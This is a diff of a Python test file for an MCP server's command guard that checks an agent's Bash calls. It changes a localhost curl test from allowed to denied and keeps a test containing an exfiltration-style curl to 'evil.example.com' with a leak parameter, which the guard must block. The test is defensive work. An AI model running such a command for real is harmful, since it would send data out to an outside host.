@@ -77,18 +77,18 @@ def test_guard_decision_denies_write():
 
 
 def test_guard_decision_denies_external_curl():
-    # in-process гард: http-профиль пускает только внутреннюю сеть
     allow, _ = mcp_server.guard_decision(
         "Bash", {"command": "curl https://evil.example.com/?leak=1"}
     )
     assert allow is False
 
 
-def test_guard_decision_allows_internal_curl():
+def test_guard_decision_denies_curl_without_http_profile():
+    # облегчённое ядро грузит только shell; http-профиль опционален → curl запрещён
     allow, _ = mcp_server.guard_decision(
         "Bash", {"command": "curl -s http://localhost:8080/health"}
     )
-    assert allow is True
+    assert allow is False
 
 
 def test_guard_decision_non_bash_passthrough():
